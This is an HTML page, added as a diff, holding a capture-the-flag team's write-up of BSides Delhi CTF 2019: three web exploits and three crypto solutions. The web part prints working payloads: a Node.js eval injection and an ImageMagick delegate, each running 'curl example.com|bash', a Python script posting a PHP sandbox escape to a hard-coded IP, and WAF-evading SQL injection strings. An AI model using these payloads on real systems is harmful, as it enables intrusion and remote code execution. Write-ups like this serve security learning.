@@ -1,0 +1,349 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>BSides Delhi CTF 2019</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#weird-calculator">weird-calculator</a>
+    
+                <a class="dropdown-item" href="#eval-me">eval-me</a>
+    
+                <a class="dropdown-item" href="#seek-you-el">seek-you-el</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#securemac">securemac</a>
+    
+                <a class="dropdown-item" href="#babyrsa">babyrsa</a>
+    
+                <a class="dropdown-item" href="#extendedelgamal">extendedelgamal</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#weird-calculator" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">weird-calculator</span>
+            </a>
+    
+<a href="#eval-me" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">eval-me</span>
+            </a>
+    
+<a href="#seek-you-el" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">seek-you-el</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#securemac" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">securemac</span>
+            </a>
+    
+<a href="#babyrsa" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">babyrsa</span>
+            </a>
+    
+<a href="#extendedelgamal" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">extendedelgamal</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="bsides-delhi-ctf-2019"><a class="header-link" href="#bsides-delhi-ctf-2019"></a>BSides Delhi CTF 2019</h1>
+
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="weird-calculator"><a class="header-link" href="#weird-calculator"></a>Weird Calculator</h3>
+<p>After a little fuzzing we found it&#39;s running nodejs <code>eval</code>.</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">(<span class="hljs-string">'child_process'</span>)</span></span>.exec(<span class="hljs-string">'curl example.com|bash'</span>)</code></pre><p>Half of the flag is in source code, and the other is in a another file.</p>
+<p>Flag: <code>bsides_delhi{Prototype_nd_sh3ll1ng_by_the_Cs1de}</code></p>
+<h3 id="eval-me"><a class="header-link" href="#eval-me"></a>Eval Me</h3>
+<p>In this callenge, we can execute php <code>eval()</code> but it has lots of disabled functions. <code>openbase_dir</code> is also set.</p>
+<p>Let&#39;s first bypass <code>openbae_dir</code> to see if we can directly read the flag.</p>
+<pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+var_dump(getcwd());
+mkdir(<span class="hljs-string">'foo'</span>);
+chdir(<span class="hljs-string">'foo'</span>);
+ini_set(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'..'</span>);
+chdir(<span class="hljs-string">'..'</span>);
+chdir(<span class="hljs-string">'..'</span>);
+chdir(<span class="hljs-string">'..'</span>);
+chdir(<span class="hljs-string">'..'</span>);
+chdir(<span class="hljs-string">'..'</span>);
+chdir(<span class="hljs-string">'..'</span>);
+ini_set(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'/'</span>);
+var_dump(file(<span class="hljs-string">"/flag"</span>)); <span class="hljs-comment">// because fopen, file_get_contents are disabled</span>
+var_dump(getcwd());
+<span class="hljs-keyword">foreach</span> (glob(<span class="hljs-string">"/*flag"</span>) <span class="hljs-keyword">as</span> $filename) {                                                                                        
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"$filename size "</span> . filesize($filename) . <span class="hljs-string">"\n"</span>;
+}</code></pre><p>Sadly, no. We need to execute <code>/readFlag</code>.</p>
+<p>Let&#39;s collect more information:</p>
+<ol class="list">
+<li><code>putenv</code> is not in disabed functions.</li>
+<li><code>imagemagick</code> plugin is installed.</li>
+</ol>
+<p>First, I tried to overwrite <code>$PATH</code> but it somehow does not work....</p>
+<p>Anyway, at least we can bypass the php sandbox via LD_PRELOAD + imagemagick. Please see the <a href="https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy">Wallbreaker easy from 0CTF/TCTF Quals</a> here.</p>
+<p>However, I found another <a href="https://www.cnblogs.com/wfzWebSecuity/p/11279895.html">interesting writeup</a>. Section 3-1 shows that we can also overwrite <code>delegate.xml</code> by defining <code>MAGICK_CONFIGURE_PATH</code> environment variable.</p>
+<p>This is much more interesting compared to the <code>LD_PRELOAD</code> trick. Let&#39;s try this.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> requests
+s = requests.session()
+payload=<span class="hljs-string">'''
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+mkdir('foo');
+chdir('foo');
+ini_set('open_basedir','..');
+chdir('..');
+chdir('..');
+chdir('..');
+chdir('..');
+chdir('..');
+chdir('..');
+ini_set('open_basedir','/');
+var_dump("------------------------------------------");
+var_dump($SANDBOX);
+var_dump($_FILES["file"]);
+mkdir("/var/tmp/.systemd");
+$fileext="pokemon";
+var_dump(move_uploaded_file($_FILES["file"]["tmp_name"], "/var/tmp/.systemd/delegates.xml"));
+var_dump(move_uploaded_file($_FILES["img"]["tmp_name"], "/var/tmp/.systemd/.a.".$fileext));
+foreach (glob("/var/tmp/.systemd/.*") as $filename) {
+    var_dump("$filename size " . filesize($filename) . "\n");
+}
+__halt_compiler();
+array_map('rmdir', glob("/var/tmp/*"));
+putenv('MAGICK_CONFIGURE_PATH=/var/tmp/.systemd');
+var_dump(file("/var/tmp/.systemd/.a.".$fileext));
+$img = new Imagick('/var/tmp/.systemd/.a.'.$fileext);
+var_dump($img);
+$img = new Imagick('/var/tmp/.systemd/.a.'.$fileext);
+var_dump($img);
+var_dump("------------------------------------------");
+'''</span>.replace(<span class="hljs-string">'\n'</span>, <span class="hljs-string">''</span>)
+r = s.post(<span class="hljs-string">'http://34.67.7.120/'</span>, params=dict(input=payload), files={<span class="hljs-string">'file'</span>: (<span class="hljs-string">'foo'</span>, <span class="hljs-string">'''
+&lt;delegatemap&gt;
+  &lt;delegate decode="pokemon" command="sh -c &amp;quot;curl example.com|bash&amp;quot;"/&gt;
+&lt;/delegatemap&gt;
+'''</span>), <span class="hljs-string">'img'</span>: (<span class="hljs-string">'bar'</span>, <span class="hljs-string">'bazz'</span>)})
+print(r.text)</code></pre><p>Flag: <code>bsides_delhi{PHP-Imagick,isn&#39;t_fun??SOFFICE}`</code></p>
+<h3 id="seek-you-el"><a class="header-link" href="#seek-you-el"></a>Seek You El</h3>
+<p>In this challenge, there is a SQL Injection on the pw parameter.</p>
+<p>We need to login as admin to get the flag, but <code>/?%5f=&#39; or 1=1 and user=x&#39;61646d696e&#39;#</code> not work.</p>
+<p>So maybe we need to get the <code>pw</code> value of the <code>admin</code> to login.</p>
+<p>And there is WAF in this challenge, we can&#39;t use <code>()</code>, <code>select</code>, <code>sleep</code>, ....</p>
+<p>Then I found that we can use SQL error to do boolean-based SQL Injection:</p>
+<p><code>/?%5f=&#39;or ~0+1#</code> =&gt; Error</p>
+<p><code>/?%5f=&#39;or ~0+0#</code> =&gt; OK</p>
+<p>OK, let&#39;s dump pw:</p>
+<p><code>/?%5f=&#39;or user=x&#39;61646d696e&#39; and (~(ascii(mid(pw,1,1))&gt;0)+1) #</code></p>
+<p><code>/?%5f=&#39;or user=x&#39;61646d696e&#39; and (~(ascii(mid(pw,1,1))&gt;100)+1) #</code></p>
+<p>...</p>
+<p>Then we have <code>pw</code>: <code>9f3b7c0e1a</code></p>
+<p>Using this pw to login and get the flag:</p>
+<p class="img-container"><img src="https://github.com/w181496/CTF/raw/master/bsides_delphi_ctf_2019/SeekYouEl/seek.png" alt=""></p>
+<p><code>bsides_delhi{sequel_injections_are_really_great_i_guess_dont_you_think?}</code></p>
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="securemac"><a class="header-link" href="#securemac"></a>SecureMAC</h3>
+<p>Two parts in this challenge:</p>
+<ol class="list">
+<li>get the key</li>
+<li>generate a collision to this mac</li>
+</ol>
+<h4 id="first-part"><a class="header-link" href="#first-part"></a>First Part</h4>
+<p>Same technique as in <a href="https://github.com/OAlienO/CTF/tree/master/2019/CSAW-CTF/Fault-Box">CSAW CTF - Fault Box</a></p>
+<p>let <code>f</code> be <code>bytes_to_long(&quot;fake_flag&quot;)</code>
+<code>c</code> will be <code>f ** e + k * p</code> for some <code>k</code>
+We know the value of <code>f ** e</code>
+Simply calculate <code>gcd(f ** e - c, n)</code> will give us prime factor <code>p</code>, then we can factor <code>n</code></p>
+<h4 id="second-part"><a class="header-link" href="#second-part"></a>Second Part</h4>
+<p>To make things simple, we send messages of 32 bytes.
+Both <code>messageblocks[1]</code> and <code>tag</code>, which is <code>ECB.encrypt(messageblocks[0])</code> we can control
+Just make the result of <code>strxor</code> be the same</p>
+<p>flag: <code>bsides_delhi{F4ult&#39;n&#39;F0rg3_1s_@_b4d_c0mb1n4ti0n}</code></p>
+<h3 id="babyrsa"><a class="header-link" href="#babyrsa"></a>BabyRSA</h3>
+<p>This is yet another RSA challenge
+<code>salt</code> can be decrypt directly
+Then, use wiener attack to factor <code>n = p * q</code> and get <code>p1 * p2</code>
+Simply gcd <code>p1 * p2</code> with <code>n1</code> and <code>n2</code> and get all the prime factors
+Note that <code>gcd(e1, (p1 - 1) * (q1 - 1)) != 1</code> and <code>gcd(e2, (p2 - 1) * (q2 - 1)) != 1</code>, we can&#39;t directly decrypt <code>magic</code>
+Luckily, <code>gcd(e1, q1 - 1) == 2</code> and <code>gcd(e2, q2 - 1) == 2</code>
+We can get <code>m ** 2 % q1</code> and <code>m ** 2 % q2</code>
+Then use the same technique as in Rabin cryptosystem, which is modular square root and chinese remainder theorem</p>
+<p>flag: <code>bsides_delhi{JuG1iNg_WiTh_RS4}</code></p>
+<h3 id="extendedelgamal"><a class="header-link" href="#extendedelgamal"></a>ExtendedElgamal</h3>
+<p><code>rand = lambda: random.randint(133700000,2333799999)</code> this is a small range
+Brute force it and get <code>z</code>
+Then calculate <code>e / (g^k)^z</code> to get <code>m</code></p>
+<p>flag: <code>bsides_delhi{that5_som3_b4d_k3y_generation!}</code></p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
